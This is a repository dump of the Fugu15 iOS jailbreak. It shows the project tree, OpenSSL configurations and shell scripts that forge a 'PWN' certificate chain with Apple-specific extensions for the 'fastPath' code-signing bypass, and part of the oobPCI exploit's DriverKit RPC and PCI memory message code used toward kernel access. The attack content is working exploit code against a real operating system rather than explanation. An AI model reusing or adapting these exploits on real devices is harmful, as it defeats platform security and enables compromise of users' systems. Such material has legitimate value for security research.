Project Path: arc_gmh5225_IOS-jailbreak--Fugu15_y7sid2b2

Source Tree:

```txt
arc_gmh5225_IOS-jailbreak--Fugu15_y7sid2b2
├── Exploits
│   ├── fastPath
│   │   ├── arm.pfx
│   │   ├── ca.conf
│   │   ├── clean.sh
│   │   ├── genCrt.sh
│   │   ├── itd.conf
│   │   ├── usr_arm.conf
│   │   ├── usr_x86_64.conf
│   │   └── x86_64.pfx
│   └── oobPCI
│       ├── Makefile
│       ├── Sources
│       │   ├── DriverKit.c
│       │   ├── DriverKit.h
│       │   ├── DriverKitClasses.h
│       │   ├── Fugu15KRW.h
│       │   ├── asm.S
│       │   ├── badRecovery.c
│       │   ├── badRecovery.h
│       │   ├── device.defs
│       │   ├── generated
│       │   │   ├── device.c
│       │   │   ├── device.h
│       │   │   ├── mach_host.c
│       │   │   ├── mach_host.h
│       │   │   ├── task.c
│       │   │   ├── task.h
│       │   │   ├── thread.c
│       │   │   └── thread.h
│       │   ├── includeme.h
│       │   ├── kernel.c
│       │   ├── kernel.h
│       │   ├── kernrw_alloc.c
│       │   ├── kernrw_alloc.h
│       │   ├── mach.c
│       │   ├── mach_host.defs
│       │   ├── main.c
│       │   ├── misc.c
│       │   ├── offsets.c
│       │   ├── offsets.h
│       │   ├── oobPCI.c
│       │   ├── oobPCI.h
│       │   ├── physrw.c
│       │   ├── physrw.h
│       │   ├── print.c
│       │   ├── task.defs
│       │   ├── thread.defs
│       │   ├── tlbFail.c
│       │   ├── tlbFail.h
│       │   └── xprr.h
│       └── oobPCI.entitlements
├── Fugu15
│   ├── Fugu15
│   │   ├── AboutView.swift
│   │   ├── Assets.xcassets
│   │   │   ├── AccentColor.colorset
│   │   │   │   └── Contents.json
│   │   │   ├── AppIcon.appiconset
│   │   │   │   ├── 100.png
│   │   │   │   ├── 1024.png
│   │   │   │   ├── 114.png
│   │   │   │   ├── 120.png
│   │   │   │   ├── 128.png
│   │   │   │   ├── 144.png
│   │   │   │   ├── 152.png
│   │   │   │   ├── 16.png
│   │   │   │   ├── 167.png
│   │   │   │   ├── 180.png
│   │   │   │   ├── 20.png
│   │   │   │   ├── 256.png
│   │   │   │   ├── 29.png
│   │   │   │   ├── 32.png
│   │   │   │   ├── 40.png
│   │   │   │   ├── 50.png
│   │   │   │   ├── 512.png
│   │   │   │   ├── 57.png
│   │   │   │   ├── 58.png
│   │   │   │   ├── 60.png
│   │   │   │   ├── 64.png
│   │   │   │   ├── 72.png
│   │   │   │   ├── 76.png
│   │   │   │   ├── 80.png
│   │   │   │   ├── 87.png
│   │   │   │   └── Contents.json
│   │   │   ├── Contents.json
│   │   │   ├── FuguIcon.imageset
│   │   │   │   ├── 1024.png
│   │   │   │   ├── 256.png
│   │   │   │   ├── 512.png
│   │   │   │   └── Contents.json
│   │   │   ├── PinautenLogo.imageset
│   │   │   │   ├── Contents.json
│   │   │   │   ├── Pinauten_Logo_SecResearch_1024.png
│   │   │   │   ├── Pinauten_Logo_SecResearch_2048.png
│   │   │   │   └── Pinauten_Logo_SecResearch_4096.png
│   │   │   ├── Pinauten_Logo_SecResearch_1024.png
│   │   │   ├── Pinauten_Logo_SecResearch_2048.png
│   │   │   └── Pinauten_Logo_SecResearch_4096.png
│   │   ├── ContentView.swift
│   │   ├── Fugu15-Bridging-Header.h
│   │   ├── Fugu15.entitlements
│   │   ├── Fugu15App.swift
│   │   ├── Info.plist
│   │   ├── JailbreakView.swift
│   │   ├── LogView.swift
│   │   ├── Preview Content
│   │   │   └── Preview Assets.xcassets
│   │   │       └── Contents.json
│   │   ├── RemoveFuguInstall.swift
│   │   ├── bootstrap
│   │   │   ├── TrustCache
│   │   │   ├── bootstrap.tar
│   │   │   ├── sileo.deb
│   │   │   └── tar
│   │   ├── include
│   │   │   ├── LSApplicationProxy.h
│   │   │   ├── LSApplicationWorkspace.h
│   │   │   ├── LSBundleProxy.h
│   │   │   ├── _LSApplicationState.h
│   │   │   └── posix_spawn.h
│   │   └── main.swift
│   ├── Fugu15.xcodeproj
│   │   ├── project.pbxproj
│   │   └── project.xcworkspace
│   │       ├── contents.xcworkspacedata
│   │       └── xcshareddata
│   │           ├── IDEWorkspaceChecks.plist
│   │           └── swiftpm
│   │               └── Package.resolved
│   └── Makefile
├── FuguInstall
│   ├── FuguInstall.entitlements
│   ├── Makefile
│   ├── Package.resolved
│   ├── Package.swift
│   ├── README.md
│   └── Sources
│       ├── CBindings
│       │   ├── dummy.c
│       │   └── include
│       │       ├── LSApplicationProxy.h
│       │       ├── LSApplicationWorkspace.h
│       │       ├── LSBundleProxy.h
│       │       ├── _LSApplicationState.h
│       │       └── posix_spawn.h
│       └── FuguInstall
│           ├── ContentView.swift
│           ├── FuguInstallApp.swift
│           └── main.swift
├── LICENSE
├── Makefile
├── Packages
│   ├── Fugu15KernelExploit
│   │   ├── Package.swift
│   │   ├── README.md
│   │   └── Sources
│   │       ├── CBindings
│   │       │   ├── include
│   │       │   │   ├── CBindings.h
│   │       │   │   ├── posix_spawn.h
│   │       │   │   └── th_state.h
│   │       │   └── th_state.c
│   │       └── Fugu15KernelExploit
│   │           ├── Fugu15.swift
│   │           ├── Logger.swift
│   │           ├── SpawnDrv
│   │           │   ├── SpawnDrv.swift
│   │           │   └── tp.swift
│   │           ├── codelessKext.swift
│   │           ├── iDownloadCmds.swift
│   │           ├── iDownloadKRW.swift
│   │           ├── krw.swift
│   │           └── oobPCI.swift
│   └── ProcessCommunication
│       ├── Package.swift
│       ├── README.md
│       └── Sources
│           └── ProcessCommunication
│               └── ProcessCommunication.swift
├── README.md
├── Server
│   ├── Fugu15.ipa
│   ├── FuguInstall
│   ├── buildIPA.py
│   ├── server.py
│   ├── serverCert
│   │   └── README.md
│   ├── static
│   │   ├── FuguInstall_512_512.png
│   │   └── FuguInstall_57_57.png
│   └── templates
│       ├── index.html
│       └── manifest.plist
└── Tools
    ├── Exe2Driver
    │   ├── Exe2Driver
    │   ├── Makefile
    │   ├── Package.resolved
    │   ├── Package.swift
    │   ├── README.md
    │   └── Sources
    │       └── Exe2Driver
    │           └── main.swift
    ├── Makefile
    ├── Makefile.inc
    ├── fastPathSign
    │   ├── Makefile
    │   ├── Package.swift
    │   ├── README.md
    │   ├── Sources
    │   │   ├── Security_Codesign
    │   │   │   ├── SecCodeSigner.h
    │   │   │   └── module.modulemap
    │   │   └── fastPathSign
    │   │       └── main.swift
    │   └── fastPathSign
    └── installHaxx
        ├── Makefile
        ├── Package.resolved
        ├── Package.swift
        ├── README.md
        ├── Sources
        │   └── installHaxx
        │       └── main.swift
        └── installHaxx

```

`Exploits/fastPath/ca.conf`:

```conf
[ ca ]
# `man ca`
default_ca = default_ca

[ default_ca ]
dir             = .
private_key     = $dir/ca.key
certificate     = $dir/ca.crt
policy          = policy_loose
new_certs_dir   = $dir/nCerts
database          = $dir/index.txt
serial            = $dir/serial
RANDFILE          = $dir/private/.rand

[ policy_loose ]
# Allow the intermediate CA to sign a more diverse range of certificates.
# See the POLICY FORMAT section of the `ca` man page.
countryName             = optional
stateOrProvinceName     = optional
localityName            = optional
organizationName        = optional
organizationalUnitName  = optional
commonName              = supplied
emailAddress            = optional

[ req ]
# Options for the `req` tool (`man req`).
default_bits        = 2048
distinguished_name  = req_distinguished_name
string_mask         = utf8only

# SHA-1 is deprecated, so use SHA-2 instead.
default_md          = sha256

# Extension to add when the -x509 option is used.
x509_extensions     = v3_ca

[ req_distinguished_name ]
# See <https://en.wikipedia.org/wiki/Certificate_signing_request>.
countryName                     = Country Name (2 letter code)
stateOrProvinceName             = State or Province Name
localityName                    = Locality Name
0.organizationName              = Organization Name
organizationalUnitName          = Organizational Unit Name
commonName                      = Common Name
emailAddress                    = Email Address

# Optionally, specify some defaults.
countryName_default             = DE
stateOrProvinceName_default     = Germany
localityName_default            = Boppard
0.organizationName_default      = Pinauten GmbH
organizationalUnitName_default  = Pinauten
emailAddress_default            = contact@pinauten.de
commonName_default              = Pinauten PWN CA

[ v3_ca ]
# Extensions for a typical CA (`man x509v3_config`).
basicConstraints = critical, CA:true
keyUsage = critical, digitalSignature, keyCertSign
extendedKeyUsage = codeSigning
1.2.840.113635.100.6.22 = critical,ASN1:NULL
1.2.840.113635.100.6.1.3 = critical,ASN1:NULL
1.2.840.113635.100.6.1.25.1 = critical,ASN1:NULL

[ v3_intermediate_ca ]
# Extensions for a typical CA (`man x509v3_config`).
basicConstraints = critical, CA:true
keyUsage = critical, digitalSignature, keyCertSign
extendedKeyUsage = codeSigning
1.2.840.113635.100.6.22 = critical,ASN1:NULL
1.2.840.113635.100.6.1.3 = critical,ASN1:NULL
1.2.840.113635.100.6.1.25.1 = critical,ASN1:NULL

```

`Exploits/fastPath/clean.sh`:

```sh
rm -f index.txt.* index.txt ca.key ca.crt cbd.crt itd.crt itd.key itd.csr.pem usr_arm.crt usr_arm.csr.pem usr_arm.key usr_x86_64.crt usr_x86_64.csr.pem usr_x86_64.key serial serial.*
rm -rf ncerts

```

`Exploits/fastPath/genCrt.sh`:

```sh
set -e

openssl genrsa -out ca.key 2048
openssl genrsa -out itd.key 2048
openssl genrsa -out usr_x86_64.key 2048
openssl genrsa -out usr_arm.key 2048

openssl req -new -x509 -key ca.key -out ca.crt -config ca.conf -days 3650 -batch
openssl req -config itd.conf -new -sha256 -key itd.key -out itd.csr.pem -batch
openssl req -config usr_x86_64.conf -new -sha256 -key usr_x86_64.key -out usr_x86_64.csr.pem -batch
openssl req -config usr_arm.conf -new -sha256 -key usr_arm.key -out usr_arm.csr.pem -batch

echo 1000 > serial
mkdir -p ncerts
rm -f index.txt.* index.txt && touch index.txt

openssl ca -config ca.conf -extensions v3_intermediate_ca -days 3650 -notext -in itd.csr.pem -out itd.crt -md sha256 -batch

rm -f index.txt.* index.txt && touch index.txt

openssl ca -config itd.conf -extensions x86_64_cert -days 3650 -notext -in usr_x86_64.csr.pem -out usr_x86_64.crt -md sha256 -batch

rm -f index.txt.* index.txt && touch index.txt

openssl ca -config itd.conf -extensions arm_cert -days 3650 -notext -in usr_arm.csr.pem -out usr_arm.crt -md sha256 -batch

cat ca.crt itd.crt > cbd.crt

openssl pkcs12 -export -out x86_64.pfx -inkey usr_x86_64.key -in usr_x86_64.crt -certfile cbd.crt -password pass:password
openssl pkcs12 -export -out arm.pfx -inkey usr_arm.key -in usr_arm.crt -certfile cbd.crt -password pass:password

```

`Exploits/fastPath/itd.conf`:

```conf
[ ca ]
# `man ca`
default_ca = default_ca

[ default_ca ]
dir             = .
private_key     = $dir/itd.key
certificate     = $dir/itd.crt
policy          = policy_loose
new_certs_dir   = $dir/nCerts
database          = $dir/index.txt
serial            = $dir/serial
RANDFILE          = $dir/private/.rand

[ policy_loose ]
# Allow the intermediate CA to sign a more diverse range of certificates.
# See the POLICY FORMAT section of the `ca` man page.
countryName             = optional
stateOrProvinceName     = optional
localityName            = optional
organizationName        = optional
organizationalUnitName  = optional
commonName              = supplied
emailAddress            = optional

[ req ]
# Options for the `req` tool (`man req`).
default_bits        = 2048
distinguished_name  = req_distinguished_name
string_mask         = utf8only

# SHA-1 is deprecated, so use SHA-2 instead.
default_md          = sha256

# Extension to add when the -x509 option is used.
x509_extensions     = v3_ca

[ req_distinguished_name ]
# See <https://en.wikipedia.org/wiki/Certificate_signing_request>.
countryName                     = Country Name (2 letter code)
stateOrProvinceName             = State or Province Name
localityName                    = Locality Name
0.organizationName              = Organization Name
organizationalUnitName          = Organizational Unit Name
commonName                      = Common Name
emailAddress                    = Email Address

# Optionally, specify some defaults.
countryName_default             = DE
stateOrProvinceName_default     = Germany
localityName_default            = Boppard
0.organizationName_default      = Pinauten GmbH
organizationalUnitName_default  = Pinauten
emailAddress_default            = contact@pinauten.de
commonName_default              = Pinauten PWN Intermediate CA

[ v3_ca ]
# Extensions for a typical CA (`man x509v3_config`).
basicConstraints = critical, CA:true
keyUsage = critical, digitalSignature, keyCertSign
extendedKeyUsage = codeSigning
1.2.840.113635.100.6.22 = critical,ASN1:NULL
1.2.840.113635.100.6.1.3 = critical,ASN1:NULL
1.2.840.113635.100.6.1.25.1 = critical,ASN1:NULL

[ x86_64_cert ]
# Extensions for a typical CA (`man x509v3_config`).
basicConstraints = critical, CA:true
keyUsage = critical, digitalSignature, keyCertSign
extendedKeyUsage = codeSigning
1.2.840.113635.100.6.22 = critical,ASN1:NULL
1.2.840.113635.100.6.1.25.1 = critical,ASN1:NULL

[ arm_cert ]
# Extensions for a typical CA (`man x509v3_config`).
basicConstraints = critical, CA:true
keyUsage = critical, digitalSignature, keyCertSign
extendedKeyUsage = codeSigning
1.2.840.113635.100.6.1.3 = critical,ASN1:NULL
1.2.840.113635.100.6.1.25.1 = critical,ASN1:NULL

```

`Exploits/fastPath/usr_arm.conf`:

```conf
[ ca ]
# `man ca`
default_ca = default_ca

[ default_ca ]
dir             = .
private_key     = $dir/itd.key
certificate     = $dir/itd.crt
policy          = policy_loose
new_certs_dir   = $dir/nCerts
database          = $dir/index.txt
serial            = $dir/serial
RANDFILE          = $dir/private/.rand

[ policy_loose ]
# Allow the intermediate CA to sign a more diverse range of certificates.
# See the POLICY FORMAT section of the `ca` man page.
countryName             = optional
stateOrProvinceName     = optional
localityName            = optional
organizationName        = optional
organizationalUnitName  = optional
commonName              = supplied
emailAddress            = optional

[ req ]
# Options for the `req` tool (`man req`).
default_bits        = 2048
distinguished_name  = req_distinguished_name
string_mask         = utf8only

# SHA-1 is deprecated, so use SHA-2 instead.
default_md          = sha256

# Extension to add when the -x509 option is used.
x509_extensions     = v3_ca

[ req_distinguished_name ]
# See <https://en.wikipedia.org/wiki/Certificate_signing_request>.
countryName                     = Country Name (2 letter code)
stateOrProvinceName             = State or Province Name
localityName                    = Locality Name
0.organizationName              = Organization Name
organizationalUnitName          = Organizational Unit Name
commonName                      = Common Name
emailAddress                    = Email Address

# Optionally, specify some defaults.
countryName_default             = DE
stateOrProvinceName_default     = Germany
localityName_default            = Boppard
0.organizationName_default      = Pinauten GmbH
organizationalUnitName_default  = Pinauten
emailAddress_default            = contact@pinauten.de
commonName_default              = Pinauten PWN Cert

[ v3_ca ]
# Extensions for a typical CA (`man x509v3_config`).
basicConstraints = critical, CA:true
keyUsage = critical, digitalSignature, keyCertSign
extendedKeyUsage = codeSigning
1.2.840.113635.100.6.22 = critical,ASN1:NULL
1.2.840.113635.100.6.1.3 = critical,ASN1:NULL
1.2.840.113635.100.6.1.25.1 = critical,ASN1:NULL

```

`Exploits/fastPath/usr_x86_64.conf`:

```conf
[ ca ]
# `man ca`
default_ca = default_ca

[ default_ca ]
dir             = .
private_key     = $dir/itd.key
certificate     = $dir/itd.crt
policy          = policy_loose
new_certs_dir   = $dir/nCerts
database          = $dir/index.txt
serial            = $dir/serial
RANDFILE          = $dir/private/.rand

[ policy_loose ]
# Allow the intermediate CA to sign a more diverse range of certificates.
# See the POLICY FORMAT section of the `ca` man page.
countryName             = optional
stateOrProvinceName     = optional
localityName            = optional
organizationName        = optional
organizationalUnitName  = optional
commonName              = supplied
emailAddress            = optional

[ req ]
# Options for the `req` tool (`man req`).
default_bits        = 2048
distinguished_name  = req_distinguished_name
string_mask         = utf8only

# SHA-1 is deprecated, so use SHA-2 instead.
default_md          = sha256

# Extension to add when the -x509 option is used.
x509_extensions     = v3_ca

[ req_distinguished_name ]
# See <https://en.wikipedia.org/wiki/Certificate_signing_request>.
countryName                     = Country Name (2 letter code)
stateOrProvinceName             = State or Province Name
localityName                    = Locality Name
0.organizationName              = Organization Name
organizationalUnitName          = Organizational Unit Name
commonName                      = Common Name
emailAddress                    = Email Address

# Optionally, specify some defaults.
countryName_default             = DE
stateOrProvinceName_default     = Germany
localityName_default            = Boppard
0.organizationName_default      = Pinauten GmbH
organizationalUnitName_default  = Pinauten
emailAddress_default            = contact@pinauten.de
commonName_default              = Pinauten PWN Cert

[ v3_ca ]
# Extensions for a typical CA (`man x509v3_config`).
basicConstraints = critical, CA:true
keyUsage = critical, digitalSignature, keyCertSign
extendedKeyUsage = codeSigning
1.2.840.113635.100.6.22 = critical,ASN1:NULL
1.2.840.113635.100.6.1.3 = critical,ASN1:NULL
1.2.840.113635.100.6.1.25.1 = critical,ASN1:NULL

```

`Exploits/oobPCI/Makefile`:

```
SDK=macosx
TARGET=arm64-apple-macos12.0

CC=xcrun -sdk $(SDK) clang

WARNINGS=-Wall -Wpedantic -Werror
NO_WARNINGS=-Wno-gnu-statement-expression -Wno-gnu-zero-variadic-macro-arguments -Wno-gnu-empty-struct -Wno-dollar-in-identifier-extension -Wno-language-extension-token -Wno-zero-length-array
CFLAGS=-target $(TARGET) -D__arm64__ -D__aarch64__ -D__DARWIN_OPAQUE_ARM_THREAD_STATE64 -nostdlib -O0 $(WARNINGS) $(NO_WARNINGS)
LDFLAGS=-target $(TARGET) -nostdlib -dead-strip -fpie -lSystem

MIG_SOURCES=$(wildcard Sources/*.defs)
MIG_GENERATED_SOURCES=$(addprefix Sources/generated/,$(patsubst %.defs,%.c,$(notdir $(MIG_SOURCES))))
MIG_GENERATED_HEADERS=$(addprefix Sources/generated/,$(patsubst %.defs,%.h,$(notdir $(MIG_SOURCES))))

SOURCES=$(wildcard Sources/*.c) $(wildcard Sources/*.S) $(MIG_GENERATED_SOURCES)
OBJS=$(addprefix build/,$(patsubst %.c,%.o,$(patsubst %.S,%.o,$(SOURCES))))

HEADERS=$(wildcard Sources/*.h) $(MIG_GENERATED_HEADERS)

OUTPUT_DIRS=$(dir $(OBJS))

all: oobPCI

.PHONY: all build_clean clean

oobPCI: build/oobPCI
	install_name_tool -change /usr/lib/libSystem.B.dylib /System/DriverKit/System/Library/Frameworks/DriverKit.framework/DriverKit $<
	../../Tools/Exe2Driver/Exe2Driver $< $@
	@chmod +x $@
	codesign -s - -f --entitlements oobPCI.entitlements $@
	../../Tools/fastPathSign/fastPathSign $@

build/oobPCI: ensure_output_dirs $(MIG_GENERATED_SOURCES) $(MIG_GENERATED_HEADERS) $(OBJS)
	$(CC) -o $@ $(OBJS) $(LDFLAGS)

build/%.o: %.c $(HEADERS)
	$(CC) -c -o $@ $< $(CFLAGS)

build/%.o: %.S $(HEADERS)
	$(CC) -c -o $@ $< $(CFLAGS) --std=c++11
	
Sources/generated/%.h Sources/generated/%.c: Sources/%.defs
	mig -user $(patsubst %.h,%.c,$@) -header $(patsubst %.c,%.h,$@) -server /dev/null -sheader /dev/null $<

ensure_output_dirs:
	mkdir -p $(OUTPUT_DIRS)

build_clean:
	rm -rf build

clean: build_clean
	rm -f oobPCI

```

`Exploits/oobPCI/Sources/DriverKit.c`:

```c
//
//  DriverKit.c
//  oobPCI
//
//  Created by Linus Henze.
//  Copyright © 2022 Pinauten GmbH. All rights reserved.
//

#include "DriverKit.h"
#include "generated/device.h"

#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>

// Create the DriverKit Classes
#define DK_DECLARE_CLASS(name) mach_port_t DKCLASS$$$##name;
#include "DriverKitClasses.h"
#undef DK_DECLARE_CLASS

struct DKAllClassesStruct DKAllClasses[] = {
    #define DK_DECLARE_CLASS(name) { #name, &DKCLASS$$$##name },
    #undef DriverKitClasses_h
    #include "DriverKitClasses.h"
    #undef DK_DECLARE_CLASS
};

mach_port_t gDKIOPort         = 0;
mach_port_t gDKServerPort     = 0;
mach_port_t gDKOrigServerPort = 0;
mach_port_t gIOPCIDev         = 0;

void dk_resolve_class(const char *name, mach_port_t *port) {
    struct __attribute__((packed)) {
        uint32_t size;
        char name[96];
        char super[96];
        uint32_t stuff[11];
        uint64_t flags;
        uint64_t resv[8];
    } resolve;
    
    _Static_assert(sizeof(resolve) == 0x138, "Bad size!");
    
    memset(&resolve, 0, sizeof(resolve));
    resolve.size = sizeof(resolve);
    strncpy(resolve.name, name, 96);
    
    uint64_t output[2] = { 0, 0 };
    mach_msg_type_number_t inband_outputCnt = 0;
    mach_msg_type_number_t scalar_outputCnt = 2;
    mach_vm_size_t         ool_output_size  = 0;
    kern_return_t kr = io_connect_method(gDKIOPort, 0x00001000, NULL, 0, (char*) &resolve, sizeof(resolve), 0, 0, NULL, &inband_outputCnt, output, &scalar_outputCnt, 0, &ool_output_size);
    
    if (kr != KERN_SUCCESS) {
        printf("Failed to get DK Class '%s'! [io_connect_method error %x]\n", name, kr);
        exit(-1);
    }
    
    *port = (mach_port_t) output[0];
}

void dk_message_set_objects(mach_msg_port_descriptor_t *descs, mach_msg_size_t descCount, ...) {
    va_list vl;
    va_start(vl, descCount);
    
    while (descCount--) {
        descs->name        = va_arg(vl, mach_port_t);
        descs->disposition = MACH_MSG_TYPE_COPY_SEND;
        descs->type        = MACH_MSG_PORT_DESCRIPTOR;
        descs++;
    }
    
    va_end(vl);
}

void dk_init(mach_port_t ioService, mach_port_t server) {
    gDKIOPort     = ioService;
    gDKServerPort = server;
    for (size_t i = 0; i < (sizeof(DKAllClasses) / sizeof(DKAllClasses[0])); i++) {
        dk_resolve_class(DKAllClasses[i].name, DKAllClasses[i].port);
    }
}

void dk_rpc_recv(mach_port_t port, mach_msg_header_t *rpl, mach_msg_size_t rplSize) {
    if (rpl && rplSize) {
        kern_return_t kr = mach_msg(rpl, MACH_RCV_MSG|MACH_RCV_LARGE, 0, rplSize, port, 0, 0);
        if (kr != KERN_SUCCESS) {
            printf("dk_rpc_recv: Receive failed! [%x]\n", kr);
            if (kr == MACH_RCV_TOO_LARGE) {
                printf("dk_rpc_recv: Receive expected %x bytes, but only got %x!\n", rpl->msgh_size, rplSize);
            }
            
            exit(-1);
        }
    }
}

void dk_do_rpc(mach_msg_header_t *hdr, mach_msg_header_t *rpl, mach_msg_size_t rplSize) {
    mach_port_t local = mig_get_reply_port();
    
    hdr->msgh_remote_port = gDKServerPort;
    hdr->msgh_local_port  = local;
    kern_return_t kr = mach_msg(hdr, MACH_SEND_MSG, hdr->msgh_size, 0, 0, 0, 0);
    if (kr != KERN_SUCCESS) {
        puts("dk_send_message: Send failed!");
        exit(-1);
    }
    
    dk_rpc_recv(local, rpl, rplSize);
    
    mig_put_reply_port(local);
}

bool dk_can_cast_message(void *msg, size_t requiredSize, uint64_t msgId, mach_msg_size_t machObjs, uint64_t objs) {
    uint8_t *message = (uint8_t*) msg;
    
    mach_msg_header_t *hdr = (mach_msg_header_t*) message;
    if (hdr->msgh_size != requiredSize) {
        printf("dk_can_cast_message: Bad size, expected %llx, got %x!\n", (uint64_t) requiredSize, hdr->msgh_size);
        
        // Maybe an error?
        uint64_t **addr = (uint64_t**)((uintptr_t) message + hdr->msgh_size - 8);
        printf("Err: %p\n", (void*) *addr);
        
        return false;
    }
    
    if (hdr->msgh_id != 0x4DA2B68C && hdr->msgh_id != 0x4DA2B68D) {
        printf("dk_can_cast_message: Bad msgh_id, got %x!\n", hdr->msgh_id);
        return false;
    }
    
    message += sizeof(mach_msg_header_t);
    
    if (!(hdr->msgh_bits & MACH_MSGH_BITS_COMPLEX)) {
        if (machObjs || objs) {
            puts("dk_can_cast_message: Not a complex message!");
            return false;
        }
    } else {
        mach_msg_body_t *body = (mach_msg_body_t*) message;
        if (body->msgh_descriptor_count != machObjs) {
            printf("dk_can_cast_message: Bad descriptor count, expected %x, got %x!\n", machObjs, body->msgh_descriptor_count);
            return false;
        }
        
        message += sizeof(mach_msg_body_t) + (sizeof(mach_msg_port_descriptor_t) * machObjs);
    }
    
    struct DriverKitRPCHeader *dkHeader = (struct DriverKitRPCHeader*) message;
    if (dkHeader->messageID && dkHeader->messageID != msgId) {
        printf("dk_can_cast_message: Bad message id, expected %llx, got %llx!\n", msgId, dkHeader->messageID);
        return false;
    }
    
    if (dkHeader->objCount != objs) {
        printf("dk_can_cast_message: Bad object count, expected %llx, got %llx!\n", objs, dkHeader->objCount);
        return false;
    }
    
    return true;
}

void dk_assert_can_cast_message(void *message, size_t requiredSize, uint64_t msgId, mach_msg_size_t machObjs, uint64_t objs) {
    if (!dk_can_cast_message(message, requiredSize, msgId, machObjs, objs)) {
        exit(-1);
    }
}

#pragma pack(4)
DECLARE_DK_MESSAGE(DKCheckinMessage, 0xC1DBAEE5E75E22B9, 2, {
    uint64_t pad;
    char name[64];
    uint64_t tag;
    uint64_t options;
})
DECLARE_DK_MESSAGE(DKCheckinMessageReply, 0xC1DBAEE5E75E22B9, 1, {})

DECLARE_DK_MESSAGE(DKCreateQueueMessage, 0xac000428df2a91d0, 1, {
    uint64_t pad;
    char name[256];
    uint64_t flags;
})
DECLARE_DK_MESSAGE(DKCreateQueueMessageReply, 0xac000428df2a91d0, 1, {})

DECLARE_DK_MESSAGE_COMPLEX(DKSetQueuePortMessage, 0xC437E970B5609767, 2, 1, {})
DECLARE_DK_MESSAGE(DKSetQueuePortMessageReply, 0xC437E970B5609767, 0, {})

DECLARE_DK_MESSAGE(DKRegisterMessage, 0xe9722c2bb1347c28, 1, {})
DECLARE_DK_MESSAGE(DKRegisterMessageReply, 0xe9722c2bb1347c28, 0, {})

DECLARE_DK_MESSAGE(DKStartMessage, 0xab6f76dde6d693f2, 2, {})

DECLARE_DK_MESSAGE(DKPCIOpenMessage, 0xd395e45429887c65, 2, {
    uint32_t openClose;
    uint32_t flags;
})
DECLARE_DK_MESSAGE(DKPCIOpenMessageReply, 0xd395e45429887c65, 0, {})

DECLARE_DK_MESSAGE(DKPCIMemoryMessage, 0x8d1327073fe3df0b, 2, {
    uint64_t action;
    uint64_t offset;
    uint64_t data;
    uint32_t flags;
})
DECLARE_DK_MESSAGE(DKPCIMemoryMessageReply, 0x8d1327073fe3df0b, 0, {
    uint64_t result;
})

DECLARE_DK_MESSAGE(DKPCIMemoryCopyMessage, 0x8fbfd4a80b3ed3f1, 2, {
    uint64_t index;
})
DECLARE_DK_MESSAGE(DKPCIMemoryCopyMessageReply, 0x8fbfd4a80b3ed3f1, 1, {})

DECLARE_DK_MESSAGE(DKIOMemoryBufferInit, 0xb78de684e17d5a4b, 1, {
    uint64_t options;
    uint64_t size;
    uint64_t alignment;
})
DECLARE_DK_MESSAGE(DKIOMemoryBufferInitReply, 0xb78de684e17d5a4b, 1, {})

DECLARE_DK_MESSAGE(DKIOMemoryBufferSetLength, 0xc115230c191a6a9a, 1, {
    uint64_t length;
})
DECLARE_DK_MESSAGE(DKIOMemoryBufferSetLengthReply, 0xc115230c191a6a9a, 0, {})

DECLARE_DK_MESSAGE(DKIOMemoryMap, 0xC5E69B0414FF6EE5, 1, {
    uint64_t options;
    uint64_t address;
    uint64_t offset;
    uint64_t length;
    uint64_t alignment;
})
DECLARE_DK_MESSAGE(DKIOMemoryMapReply, 0xC5E69B0414FF6EE5, 1, {})

DECLARE_DK_MESSAGE(DKIOMemoryMapGetState, 0xFC92B3D7F2D48EC7, 1, {})
DECLARE_DK_MESSAGE(DKIOMemoryMapGetStateReply, 0xFC92B3D7F2D48EC7, 0, {
    uint64_t length;
    uint64_t offset;
    uint64_t options;
    uint64_t address;
})

DECLARE_DK_MESSAGE(DKIODMACommandInit, 0xf296a92bb435af2e, 2, {
    uint64_t options;
    uint64_t specOpts;
    uint64_t maxAddressBits;
    uint64_t reserved[16];
})
DECLARE_DK_MESSAGE(DKIODMACommandInitReply, 0xf296a92bb435af2e, 1, {})

DECLARE_DK_MESSAGE(DKIODMACommandPrepare, 0xF88A8C08B75B1110, 2, {
    uint64_t options;
    uint64_t offset;
    uint64_t length;
    uint64_t segCount;
    // Variable number of segments - Not required for oobPCI
})
DECLARE_DK_MESSAGE(DKIODMACommandPrepareReply, 0xF88A8C08B75B1110, 1, {})

DECLARE_DK_MESSAGE(DKIODMACommandRW, 0xc41cd97d9b3042ee, 2, {
    uint64_t options;
    uint64_t dmaOffset;
    uint64_t length;
    uint64_t dataOffset;
})
DECLARE_DK_MESSAGE(DKIODMACommandRWReply, 0xc41cd97d9b3042ee, 0, {})

void user_server_checkin(const char *name, uint64_t tag) {
    DK_MESSAGE_CONSTRUCT_OBJS(DKCheckinMessage, msg, DK_CLASS(IOUserServer), 0);
    
    strncpy(&msg.name[0], name, 64);
    msg.tag     = tag;
    msg.options = 0;
    
    DK_RPC(msg, DKCheckinMessageReply, reply);
    
    if (reply.descs[0].name == 0) {
        puts("user_server_checkin: Failed to get descriptor!");
        exit(-1);
    }
    
    gDKOrigServerPort = gDKServerPort;
    gDKServerPort     = reply.descs[0].name;
}

mach_port_t create_dispatch_queue(const char *name) {
    DK_MESSAGE_CONSTRUCT_OBJS(DKCreateQueueMessage, msg, DK_CLASS(IODispatchQueue));
    
    strncpy(&msg.name[0], name, 256);
    msg.flags = 0;
    
    DK_RPC(msg, DKCreateQueueMessageReply, reply);
    
    if (reply.descs[0].name == 0) {
        puts("create_dispatch_queue: Failed to get queue!");
        exit(-1);
    }
    
    return reply.descs[0].name;
}

void dispatch_queue_set_port(mach_port_t queue, mach_port_t port) {
    DK_MESSAGE_CONSTRUCT_OBJS(DKSetQueuePortMessage, msg, queue, port);
    
    DK_RPC(msg, DKSetQueuePortMessageReply, reply);
}

void server_register(void) {
    DK_MESSAGE_CONSTRUCT_OBJS(DKRegisterMessage, msg, gDKServerPort);
    
    DK_RPC(msg, DKRegisterMessageReply, reply);
}

mach_port_t server_get_provider(mach_port_t queuePort) {
    DK_RECVFROM(queuePort, DKStartMessage, reply);
    
    mach_port_deallocate(mach_task_self_, gDKIOPort);
    gDKIOPort = 0;
    
    return reply.descs[1].name;
}

DK_MESSAGE_CONSTRUCT(DKPCIMemoryMessage, gPCIMemoryR64Message);
DK_MESSAGE_CONSTRUCT(DKPCIMemoryMessage, gPCIMemoryR32Message);
DK_MESSAGE_CONSTRUCT(DKPCIMemoryMessage, gPCIMemoryR16Message);
DK_MESSAGE_CONSTRUCT(DKPCIMemoryMessage, gPCIMemoryR8Message);

